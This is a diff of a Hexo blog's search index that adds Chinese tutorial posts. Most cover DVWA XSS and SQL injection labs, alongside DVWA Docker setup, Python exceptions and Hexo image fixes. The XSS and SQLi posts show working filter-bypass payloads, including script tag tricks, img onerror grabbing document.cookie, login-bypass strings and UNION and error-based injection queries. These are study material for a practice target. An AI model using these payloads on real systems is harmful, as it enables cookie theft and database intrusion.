class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们发现只允许default=French、English、German、Spanish、这几个通过。</p>
+<ul>
+<li><p>非常明显的<strong>白名单过滤</strong></p>
+</li>
+<li><p>所以我们需要绕过白名单进行过滤</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">default=English#<span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">onload</span>=<span class="string">alert(/xss/)</span>&gt;</span><span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://colson-max.github.io/2022/04/29/DVWA-XSS-DOM/5.png" alt="5"></p>
+</li>
+</ul>
 ]]></content>
       <tags>
-        <tag>-Java</tag>
+        <tag>-DVWA</tag>
+        <tag>-XSS</tag>
       </tags>
   </entry>
   <entry>
-    <title>Java-注解</title>
-    <url>/2022/04/13/Java-%E6%B3%A8%E8%A7%A3/</url>
-    <content><![CDATA[<h2 id="Java-注解"><a href="#Java-注解" class="headerlink" title="Java-注解"></a>Java-注解</h2><hr>
-<h3 id="参考文献："><a href="#参考文献：" class="headerlink" title="参考文献："></a>参考文献：</h3><p><a href="https://jwt1399.top/posts/9855.html#toc-heading-15">https://jwt1399.top/posts/9855.html#toc-heading-15</a></p>
-<p><a href="https://www.runoob.com/w3cnote/java-annotation.html">https://www.runoob.com/w3cnote/java-annotation.html</a></p>
+    <title>DVWA-XSS-Reflected</title>
+    <url>/2022/05/06/DVWA-XSS-Reflected/</url>
+    <content><![CDATA[<h1 id="DVWA-XSS-Reflected"><a href="#DVWA-XSS-Reflected" class="headerlink" title="DVWA-XSS(Reflected)"></a>DVWA-XSS(Reflected)</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>反射型XXS是一种非持久性的攻击，它指的是恶意攻击者往Web页面里插入恶意代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的目的。</p>
 <hr>
-<p><strong>注解在 JavaSE 基础中，使用的并不多，在 JavaEE 中比重较大，常用来配置切面、XML配置等。</strong></p>
-<p>注解(Annotation)用于修饰解释包、类、方法、属性、构造器、局部变量等数据信息。<br>和注释一样，注解不影响程序的逻辑，但是注解可以被编译运行，相当于代码中的补充信息。</p>
-<h3 id="三个基本注解"><a href="#三个基本注解" class="headerlink" title="三个基本注解"></a>三个基本注解</h3><h4 id="1-Override"><a href="#1-Override" class="headerlink" title="1. @Override"></a>1. @Override</h4><p>限定某个方法，是重写父类方法，该注解只能用于“方法”</p>
-<h4 id="2-Deprecated"><a href="#2-Deprecated" class="headerlink" title="2. @Deprecated"></a>2. @Deprecated</h4><p>用于表示某个程序元素，该注解可以修饰方法 、类、字段、参数等。</p>
-<h4 id="3-SuppressWarnings-“all”"><a href="#3-SuppressWarnings-“all”" class="headerlink" title="3. @SuppressWarnings(“all”)"></a>3. @SuppressWarnings(“all”)</h4><p>抑制编译器警告</p>
-<h3 id="元注解"><a href="#元注解" class="headerlink" title="元注解"></a>元注解</h3><h4 id="1-JDK的元注解用于修饰其他注解"><a href="#1-JDK的元注解用于修饰其他注解" class="headerlink" title="1.JDK的元注解用于修饰其他注解"></a>1.JDK的元注解用于修饰其他注解</h4><h4 id="2-种类"><a href="#2-种类" class="headerlink" title="2.种类"></a>2.种类</h4><p>Retention //指定注解的作用范围，三种SOURCE,CLASS,RUNTIME</p>
-<p>RetentionPolicy.SOURCE: 编译器使用后，直接丢弃这种策略的注释</p>
-<p>RetentionPolicy.CLASS: 编译器将把注解记录在 class 文件中，当运行 Java 程序时, JVM 不会保留注解。这是默认值</p>
-<p>RetentionPolicy.RUNTIME:编译器将把注解记录在 class 文件中，当运行 Java 程序时, JVM 会保留注解. 程序可以通过反射获取该注解</p>
-<p>Target // 指定注解可以在哪些地方使用</p>
-<p>Documented //指定该注解是否会在javadoc 体现</p>
-<p>Inherited //子类会继承父类注解</p>
+<p>参考：</p>
+<p><a href="https://segmentfault.com/a/1190000019484055">https://segmentfault.com/a/1190000019484055</a></p>
+<hr>
+<h2 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h2><p>点开源码分析</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">	<span class="comment">// Feedback for end user</span></span><br><span class="line">	<span class="variable">$html</span> .= <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们会发现没有任何的过滤和检查。那我们可以直接攻击。</p>
+<ul>
+<li><p>构造</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p><img src="https://colson-max.github.io/2022/05/06/DVWA-XSS-Reflected/1.png" alt="1"></p>
+</li>
+</ul>
+<hr>
+<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>同样我们点开源码</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = str_replace( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到源码中，使用 <strong>str_replace</strong> 函数将输入的<code>&lt;script&gt;</code>删除。也就实现了<code>&lt;script&gt;</code>的过滤。</p>
+<ul>
+<li><p>双写绕过</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;scr<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">ipt&gt;alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://colson-max.github.io/2022/05/06/DVWA-XSS-Reflected/2.png" alt="2"></p>
+</li>
+<li><p>大小写绕过</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sCript</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>输入其他标签</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<p>这三种方法都可以绕过过滤，达到我们的预期效果。</p>
+<hr>
+<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>打开源码分析：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = preg_replace( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>代码使用了<code>preg_replace</code>函数执行一个正则表达式的搜索和替换，其中<code>/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i</code>是正则表达式<code>(.*)</code>表示贪婪匹配，<code>/i</code>表示不区分大小写</li>
+<li>所以在High级别的代码中，所有关于<code>&lt;script&gt;</code>标签均被过滤删除了</li>
+</ul>
+<p>不过我们可以通过输入其它标签的方法来进行过滤：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(document.cookie)</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <tags>
-        <tag>-Java</tag>
+        <tag>-DVWA</tag>
+        <tag>-XSS</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DVWA搭建</title>
+    <url>/2022/04/27/DVWA%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<h1 id="DVWA-搭建"><a href="#DVWA-搭建" class="headerlink" title="DVWA 搭建"></a>DVWA 搭建</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
+<li>DVWA 是一个基于 php / mysql 的web 靶机，提供安全学习和参考的平台。</li>
+<li>DVWA是运行在本地的，所以个人推荐在 服务器/Linux 上搭建，在 windows 平台上使用集成环境还好，分开配置非常麻烦 ( mac 上我不知道 )</li>
+<li>我个人是在 windows 平台配置的，为了写这个博客，在docker上再搞一次。</li>
+</ul>
+<hr>
+<p>参考：</p>
+<p><a href="https://zhuanlan.zhihu.com/p/126668420">https://zhuanlan.zhihu.com/p/126668420</a></p>
+<hr>
+<h2 id="Windows-平台"><a href="#Windows-平台" class="headerlink" title="Windows 平台"></a>Windows 平台</h2><ul>
+<li><strong>建议使用 phpstudy 搭建。</strong></li>
+<li>网上有很多教程，每个人遇到的问题不尽相同，在这就不做阐述了</li>
+</ul>
+<h2 id="Docker-下的-Linux-平台"><a href="#Docker-下的-Linux-平台" class="headerlink" title="Docker 下的 Linux 平台"></a>Docker 下的 Linux 平台</h2><h3 id="1-拉取镜像"><a href="#1-拉取镜像" class="headerlink" title="1. 拉取镜像"></a>1. 拉取镜像</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull vulnerables/web-dvwa</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-运行"><a href="#2-运行" class="headerlink" title="2. 运行"></a>2. 运行</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run --rm -it -p 80:80 vulnerables/web-dvwa</span><br></pre></td></tr></table></figure>
+
+<p>之后访问服务器 ip:80 就可以了</p>
+<h2 id="登录-DVWA"><a href="#登录-DVWA" class="headerlink" title="登录 DVWA"></a>登录 DVWA</h2><p><img src="https://colson-max.github.io/2022/04/27/DVWA%E6%90%AD%E5%BB%BA/1.png" alt="1"></p>
+<p>之后登录界面</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 账号： admin</span><br><span class="line"># 密码： password</span><br></pre></td></tr></table></figure>
+
+<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><ul>
+<li>在   DVWA Security   可以调试靶场题目的难度</li>
+</ul>
+<p><img src="https://colson-max.github.io/2022/04/27/DVWA%E6%90%AD%E5%BB%BA/2.png" alt="2"></p>
+]]></content>
+      <tags>
+        <tag>-DVWA</tag>
+        <tag>-docker</tag>
       </tags>
   </entry>
   <entry>
@@ -475,6 +624,100 @@
       <tags>
         <tag>-算法</tag>
         <tag>-Java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MongoDB基础</title>
+    <url>/2022/05/27/MongoDB%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<h1 id="MongoDB-基础"><a href="#MongoDB-基础" class="headerlink" title="MongoDB 基础"></a>MongoDB 基础</h1><hr>
+<p>参考：</p>
+<hr>
+]]></content>
+      <tags>
+        <tag>-MongoDB</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python-异常</title>
+    <url>/2022/04/23/Python-%E5%BC%82%E5%B8%B8/</url>
+    <content><![CDATA[<h2 id="Python-异常"><a href="#Python-异常" class="headerlink" title="Python-异常"></a>Python-异常</h2><hr>
+<p>参考：</p>
+<p><a href="https://jwt1399.top/posts/34992.html#toc-heading-44">https://jwt1399.top/posts/34992.html#toc-heading-44</a></p>
+<p><a href="http://blog.csdn.net/gavin_john/article/details/50738323">http://blog.csdn.net/gavin_john/article/details/50738323</a></p>
+<hr>
+<h3 id="异常报错"><a href="#异常报错" class="headerlink" title="异常报错"></a>异常报错</h3><p>打开一个不存在的文件，找不到 hello.txt 文件，会抛出异常 FileNotFoundError ，</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;hello.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://colson-max.github.io/2022/04/23/Python-%E5%BC%82%E5%B8%B8/1.png" alt="1"></p>
+<h3 id="捕获异常"><a href="#捕获异常" class="headerlink" title="捕获异常"></a>捕获异常</h3><ul>
+<li>把可能产生异常的代码放到 try 中，把相应的处理方法放在 except 中</li>
+<li>程序捕获到了异常，但是 pass 实现了相应的实现，可以把 pass 改成其它的语句</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&#x27;hello.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> IOError:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p>此处 except 捕获的异常类型是 IOError ，如果是其它类型，那么 except 将不会生效。</p>
+<p><strong>Python 的一些内建异常</strong></p>
+<table>
+<thead>
+<tr>
+<th>异常类型</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Exception</td>
+<td>常规错误基类</td>
+</tr>
+<tr>
+<td>AttributeError</td>
+<td>对象没有这个属性</td>
+</tr>
+<tr>
+<td>IOError</td>
+<td>输入/输出 操作异常</td>
+</tr>
+<tr>
+<td>IndexError</td>
+<td>序列中没有此索引</td>
+</tr>
+<tr>
+<td>KeyError</td>
+<td>映射中没有这个键</td>
+</tr>
+<tr>
+<td>NameError</td>
+<td>未声明/未初始化对象</td>
+</tr>
+<tr>
+<td>SyntaxError</td>
+<td>Python语法错误</td>
+</tr>
+<tr>
+<td>TypeError</td>
+<td>对类型无效的操作</td>
+</tr>
+<tr>
+<td>ValueError</td>
+<td>传入无效的参数</td>
+</tr>
+<tr>
+<td>ZeroDivisionError</td>
+<td>除（取模）零（所有数据类型）</td>
+</tr>
+</tbody></table>
+<p><strong>捕获多个异常</strong></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&#x27;hello.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)	<span class="comment"># 文件不存在，报错 IOError</span></span><br><span class="line">    <span class="built_in">print</span>(num)		<span class="comment"># num没有被定义，报错 NameError</span></span><br><span class="line"><span class="keyword">except</span> (IOError,NameError):			<span class="comment">#  用元组形式</span></span><br><span class="line">  	<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="获取异常的信息描述"><a href="#获取异常的信息描述" class="headerlink" title="获取异常的信息描述"></a>获取异常的信息描述</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&#x27;hello.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> IOError <span class="keyword">as</span> result:</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># output: [Errno 2] No such file or directory: &#x27;hello.txt&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="try…finally"><a href="#try…finally" class="headerlink" title="try…finally"></a>try…finally</h3><p>在程序中，如果一个段代码必须要执行，即无论异常是否产生都要执行，那么此时就需要使用ﬁnally。 比如文件关闭，释放锁，把数据库连接返还给连接池等</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    file = <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            content = file.readline()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(content) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span>	<span class="comment"># 读取文件时发生异常，将被读取到</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        file.close()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;关闭文件&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;没有这个文件&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>-python</tag>
       </tags>
   </entry>
   <entry>
@@ -740,6 +983,125 @@
       </tags>
   </entry>
   <entry>
+    <title>SQL注入</title>
+    <url>/2022/04/29/SQL%E6%B3%A8%E5%85%A5/</url>
+    <content><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><ul>
+<li><strong>sql注入</strong>可以说是 web 安全的重点，也可以说是学习安全的必经之路，非常基础，非常使用。</li>
+</ul>
+<p>基础的东西可以多学一学，而且 SQL 注入 的相关知识点可以覆盖的非常广，复习这部分内容可以让我重温一遍很多知识点，包括 一些 SQL 语句，web基础知识，数据库的一些结构等等。</p>
+<hr>
+<p>参考：</p>
+<ul>
+<li><a href="https://ctf-wiki.org/web/sqli/">https://ctf-wiki.org/web/sqli/</a></li>
+<li></li>
+<li><a href="http://drops.xmd5.com/static/drops/tools-1548.html">http://drops.xmd5.com/static/drops/tools-1548.html</a></li>
+</ul>
+<hr>
+<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul>
+<li>SQL 注入是一种将 SQL 代码插入或添加到应用（用户）的输入参数中，之后再将这些参数传递给后台的 SQL 服务器加以解析并执行的攻击。</li>
+<li>攻击者能够修改 SQL 语句，该进程将与执行命令的组件（如数据库服务器、应用服务器或 WEB 服务器）拥有相同的权限。</li>
+<li>如果 WEB 应用开发人员无法确保在将从 WEB 表单、cookie、输入参数等收到的值传递给 SQL 查询（该查询在数据库服务器上执行）之前已经对其进行过验证，通常就会出现 SQL 注入漏洞。</li>
+</ul>
+<hr>
+<h2 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h2><ul>
+<li><p>Burp Suite</p>
+<p>非常好用的工具，可以说是web必备的工具了。基本的拦截、抓包、改包、分析、加密解密都可以实现。还有很多功能我还没有弄明白，总之它很强大就对了，真心推荐 。</p>
+</li>
+<li><p>HackBar</p>
+<p>小狐自带的拓展程序，很简洁很方便，也可以实现很多的功能，可以说是最实用的，我个人用的少。</p>
+</li>
+<li><p>sqlmap</p>
+<p>非常强大的自动化SQL注入工具，主要是扫描并且自动注入，目前支持市场上大部分数据库，功能甚至包括数据库指纹识别、数据库枚举、数据提取、访问等。非常强大，并且可以跨平台使用。</p>
+<p>[^但是我个人不建议用sqlmap，它的操作可以说难度并不大，主要是输入命令，对我们的实际学习帮助不大，而且就平时的靶机训练，根本不需要扫目录，我们学安全初衷是要维护数据，而非窃取数据，而sqlmap的命令比较复杂，上手难度还是有的，建议从基础知识开始学，手工注入。]: </p>
+</li>
+</ul>
+<hr>
+<h2 id="常见的注入参数"><a href="#常见的注入参数" class="headerlink" title="常见的注入参数"></a>常见的注入参数</h2><ul>
+<li>user()</li>
+<li>database()</li>
+<li>version()</li>
+<li>concat()</li>
+<li>group_concat()</li>
+<li>concat_ws()</li>
+<li>hex() / unhex()</li>
+<li>load_file()</li>
+</ul>
+<hr>
+<h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><ul>
+<li>admin’ – 或者 admin’ #</li>
+<li>‘ or 1=1 – 或者 ‘ or 1=1 #</li>
+<li>‘) or ‘1’=’1 – 或者 ‘) or (‘1’=’1 – </li>
+</ul>
+<hr>
+<h2 id="注入语句小技巧"><a href="#注入语句小技巧" class="headerlink" title="注入语句小技巧"></a>注入语句小技巧</h2><h3 id="行间注释"><a href="#行间注释" class="headerlink" title="行间注释"></a>行间注释</h3><hr>
+  <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> admin;<span class="comment">-- 注释符后面有个空格 </span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><h1 id><a href="#" class="headerlink" title></a></h1><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> admin;#这个注释符后面不用空格</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="行内注释"><a href="#行内注释" class="headerlink" title="行内注释"></a>行内注释</h3><ul>
+<li><p>/* 注释内容 */</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span><span class="comment">/*comment*/</span>sampletable`   DR<span class="comment">/**/</span>OP<span class="comment">/*绕过过滤*/</span>sampletable`   <span class="keyword">SELECT</span><span class="comment">/*替换空格*/</span>password<span class="comment">/**/</span><span class="keyword">FROM</span><span class="comment">/**/</span>Members</span><br></pre></td></tr></table></figure></li>
+<li><p>/* mysql专属 */</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="comment">/* 注释内容 */</span> <span class="number">1</span> <span class="keyword">FROM</span> tablename</span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<h2 id="注入语句备忘"><a href="#注入语句备忘" class="headerlink" title="注入语句备忘"></a>注入语句备忘</h2><h3 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select database();</span><br><span class="line">select schema_name from information_schema.schemata;</span><br></pre></td></tr></table></figure>
+
+<h3 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h3><ul>
+<li><p>union  查询</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- MySQL 4版本时用version=9，MySQL 5版本时用version=10</span><br><span class="line"> /* 列出当前数据库中的表 */</span><br><span class="line">union select group_concat(table_name) from information_schema.tables where version=10;</span><br><span class="line">/* 列出所有用户自定义数据库中的表 */</span><br><span class="line">union select table_name from information_schema.tables where table_schema=database();   </span><br><span class="line">select table_schema, table_name from information_schema.tables where table_schema!=&#x27;information_schema&#x27; and table_schema!=&#x27;mysql&#x27;;</span><br></pre></td></tr></table></figure></li>
+<li><p>盲注</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="keyword">select</span> substr(table_name,<span class="number">1</span>,<span class="number">1</span>) <span class="keyword">from</span> information_schema.tables <span class="operator">&gt;</span> <span class="string">&#x27;A&#x27;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>报错</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND(SELECT COUNT(*) FROM (SELECT 1 UNION SELECT null UNION SELECT !1)x GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),FLOOR(RAND(0)*2))) (@:=1)||@ GROUP BY CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),!@) HAVING @||MIN(@:=0); AND ExtractValue(1, CONCAT(0x5c, (SELECT table_name FROM information_schema.tables LIMIT 1)));</span><br><span class="line">-- 在5.1.5版本中成功。</span><br></pre></td></tr></table></figure></li>
+</ul>
+]]></content>
+      <tags>
+        <tag>-SQL注入</tag>
+        <tag>-Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Spring Security OAuth2远程命令执行漏洞(CVE-2016-4977)</title>
+    <url>/2022/05/13/Spring-Security-OAuth2%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2016-4977/</url>
+    <content><![CDATA[<h2 id="Spring-Security-OAuth2远程命令执行漏洞-CVE-2016-4977"><a href="#Spring-Security-OAuth2远程命令执行漏洞-CVE-2016-4977" class="headerlink" title="Spring Security OAuth2远程命令执行漏洞(CVE-2016-4977)"></a>Spring Security OAuth2远程命令执行漏洞(CVE-2016-4977)</h2><hr>
+<p>参考：<a href="https://www.freebuf.com/vuls/329753.html">https://www.freebuf.com/vuls/329753.html</a></p>
+<p><a href="https://github.com/vulhub/vulhub/tree/master/spring/CVE-2016-4977">https://github.com/vulhub/vulhub/tree/master/spring/CVE-2016-4977</a></p>
+<hr>
+<h3 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h3>]]></content>
+      <tags>
+        <tag>-Java安全</tag>
+        <tag>-常见的Spring漏洞</tag>
+        <tag>-漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo博客图片不显示解决方案</title>
+    <url>/2022/04/02/hexo%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87%E4%B8%8D%E6%98%BE%E7%A4%BA%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/</url>
+    <content><![CDATA[<h1 id="hexo-博客图片无法显示解决方案"><a href="#hexo-博客图片无法显示解决方案" class="headerlink" title="hexo 博客图片无法显示解决方案"></a>hexo 博客图片无法显示解决方案</h1><hr>
+<p>参考：</p>
+<p><a href="https://www.jianshu.com/p/ea78bdd0551f">https://www.jianshu.com/p/ea78bdd0551f</a><br><a href="https://blog.csdn.net/androidV/article/details/105781570">https://blog.csdn.net/androidV/article/details/105781570</a></p>
+<hr>
+<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>根据此问题，网上有许多的解决方法，我也试过很多，根本原因是 hexo 升级后，对应的插件 hexo-asset-image 并未升级，所遗留下来的 bug 。</p>
+<h2 id="网上常见的解决方案"><a href="#网上常见的解决方案" class="headerlink" title="网上常见的解决方案"></a>网上常见的解决方案</h2><h3 id="1-修改博客配置"><a href="#1-修改博客配置" class="headerlink" title="1.修改博客配置"></a>1.修改博客配置</h3><p>修改博客根目录中 _config.yml 文件配置项 post_asset_folder 为 true:</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
+
+<p>之后当你通过” hexo new ‘文件名’ “ 新建博客后，会产生一个和文件同名的文件夹。</p>
+<p><img src="https://colson-max.github.io/2022/04/02/hexo%E5%8D%9A%E5%AE%A2%E5%9B%BE%E7%89%87%E4%B8%8D%E6%98%BE%E7%A4%BA%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88/1.png" alt="1"></p>
+<h3 id="2-下载插件"><a href="#2-下载插件" class="headerlink" title="2.下载插件"></a>2.下载插件</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install https://github.com/CodeFalling/hexo-asset-image --save</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-md-格式语言插入图片"><a href="#3-md-格式语言插入图片" class="headerlink" title="3.md 格式语言插入图片"></a>3.md 格式语言插入图片</h3><p>自行 google/baidu</p>
+<h2 id="修改BUG"><a href="#修改BUG" class="headerlink" title="修改BUG"></a>修改BUG</h2><p>开头也说到，这也可能是 hexo 自家的 bug 引起的。下面是修改方案：</p>
